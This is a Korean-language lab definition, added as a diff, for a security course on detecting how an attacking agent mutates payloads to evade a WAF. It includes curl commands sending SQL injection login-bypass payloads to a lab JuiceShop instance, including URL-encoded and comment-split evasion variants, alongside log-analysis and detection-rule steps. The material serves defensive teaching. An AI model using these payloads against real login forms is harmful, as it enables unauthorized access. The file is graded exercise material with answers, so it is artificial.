@@ -1,0 +1,99 @@
+lab_id: agent-ir-ai-week06
+title: 회피·다형성 — 변형 진화 탐지 (AI 지원)
+version: ai
+course: agent-ir-ai
+week: 6
+description: 에이전트가 WAF에 막힌 뒤 페이로드를 변형하는 과정을 관찰하고, 변형 진화 자체를 탐지하는 룰을 설계한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+difficulty: hard
+duration_minutes: 120
+objectives:
+- 동일 페이로드의 인코딩 변형 3종을 만들어 WAF 반응을 비교한다
+- ModSecurity 감사 로그에서 룰 매칭 분포를 읽는다
+- 변형 진화 기반 세션 탐지 로직 초안을 만든다
+pass_threshold: 0.6
+steps:
+- order: 1
+  instruction: JuiceShop 로그인 폼에 기본 SQLi 페이로드 시도
+  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+  category: recon
+  points: 9
+  answer: '🤖 프롬프트: JuiceShop 로그인 폼에 기본 SQLi 페이로드 시도
+
+    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -d ''{"email":"admin\''\'' OR 1=1--","password":"x"}'' -H ''Content-Type: application/json'''
+  answer_detail: 1차 페이로드 반응.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: 'curl -s -o /dev/null -w ''%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -d ''{"email":"admin\''\'' OR 1=1--","password":"x"}'' -H ''Content-Type: application/json'''
+  risk_level: low
+  bastion_prompt: JuiceShop 로그인 폼에 기본 SQLi 페이로드 시도
+- order: 2
+  instruction: 동일 페이로드의 URL 인코딩 변형
+  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+  category: recon
+  points: 10
+  answer: '🤖 프롬프트: 동일 페이로드의 URL 인코딩 변형
+
+    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' ''http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR%201%3D1--&password=x'''
+  answer_detail: URL 인코딩 변형 반응.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: curl -s -o /dev/null -w '%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR%201%3D1--&password=x'
+  risk_level: low
+  bastion_prompt: 동일 페이로드의 URL 인코딩 변형
+- order: 3
+  instruction: '변형 페이로드: 주석 분할 /**/'
+  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+  category: recon
+  points: 11
+  answer: '🤖 프롬프트: 변형 페이로드: 주석 분할 /**/
+
+    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' ''http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR/**/1=1--&password=x'''
+  answer_detail: 분할 기법 변형 반응.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: curl -s -o /dev/null -w '%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR/**/1=1--&password=x'
+  risk_level: low
+  bastion_prompt: '변형 페이로드: 주석 분할 /**/'
+- order: 4
+  instruction: ModSecurity 감사 로그에서 매칭 룰 ID 확인
+  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+  category: recon
+  points: 12
+  answer: '🤖 프롬프트: ModSecurity 감사 로그에서 매칭 룰 ID 확인
+
+    📎 참고 (CLI): sudo tail -30 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE ''id="[0-9]+"'' | sort | uniq -c | head -10 || echo ''NO_MODSEC_LOG'''
+  answer_detail: ModSec 룰 매칭 분포.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: sudo tail -30 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE 'id="[0-9]+"' | sort | uniq -c | head -10 || echo 'NO_MODSEC_LOG'
+  risk_level: low
+  bastion_prompt: ModSecurity 감사 로그에서 매칭 룰 ID 확인
+- order: 5
+  instruction: Bastion에 변형 진화 탐지 초안 등록
+  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+  category: analysis
+  points: 13
+  answer: '🤖 프롬프트: Bastion에 변형 진화 탐지 초안 등록
+
+    📎 참고 (CLI): echo ''{"id":"w06-evolve","rule":"seq_similar_payloads_diff_0.05_0.4_5_times"}'' >> ~/ccc/data/bastion/experience/w06.json && tail -1 ~/ccc/data/bastion/experience/w06.json'
+  answer_detail: 변형 진화 탐지 로직 초안 저장.
+  verify:
+    type: output_contains
+    expect: evolve
+    field: stdout
+  target_vm: bastion
+  script: echo '{"id":"w06-evolve","rule":"seq_similar_payloads_diff_0.05_0.4_5_times"}' >> ~/ccc/data/bastion/experience/w06.json && tail -1 ~/ccc/data/bastion/experience/w06.json
+  risk_level: low
+  bastion_prompt: Bastion에 변형 진화 탐지 초안 등록
